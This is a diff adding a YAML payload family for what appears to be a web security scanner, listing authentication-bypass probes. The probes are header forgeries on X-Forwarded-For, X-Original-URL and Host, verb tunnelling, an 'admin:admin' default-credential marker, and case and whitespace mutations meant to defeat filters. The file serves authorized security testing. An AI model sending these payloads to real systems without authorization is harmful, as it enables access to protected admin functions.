@@ -1,0 +1,53 @@
+family_id: auth_bypass
+description: >-
+  Authentication-bypass probes covering trust-boundary header forgery
+  (X-Forwarded-For, X-Original-URL, Host), HTTP-verb tunnelling, and
+  default-credential markers. Conservative seeds — no real password
+  candidates; the validator pairs each with the target's documented
+  identity workflow.
+cwe_ids: [287, 290, 305, 798]
+owasp_top10:
+  - 'A07:2021'
+risk_level: medium
+requires_approval: false
+oast_required: false
+payloads:
+  - id: xff_loopback
+    template: 'X-Forwarded-For: 127.0.0.1'
+    confidence: likely
+    notes: Trust-boundary forgery; differential vs control IP confirms accept.
+  - id: xff_oast
+    template: 'X-Forwarded-For: {oast_host}'
+    confidence: suspected
+    notes: OAST-host XFF; some logs leak the hostname during reverse-DNS.
+  - id: xou_admin
+    template: 'X-Original-URL: /admin/{canary}'
+    confidence: likely
+    notes: Override target path via XOU; bypasses authn middleware on /admin.
+  - id: host_override
+    template: 'Host: admin.internal'
+    confidence: suspected
+    notes: Host-header override probe; tests virtual-host routing trust.
+  - id: verb_tunnel_method
+    template: 'X-HTTP-Method-Override: PUT'
+    confidence: suspected
+    notes: Verb-tunnelling header; bypasses GET-only authn middleware.
+  - id: default_admin_marker
+    template: 'admin:admin'
+    confidence: suspected
+    notes: Default-credential marker for fingerprinting only — never used in auto-login.
+mutations:
+  - name: case_flip
+    description: HTTP header names are case-insensitive; flips defeat substring filters.
+  - name: whitespace_alt
+    description: Whitespace-around-colon variants probe parser robustness.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw header / form payload.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded for query-string sinks.
+  - name: base64
+    stages: [base64]
+    description: Base64-encoded; tests Authorization-header sinks.
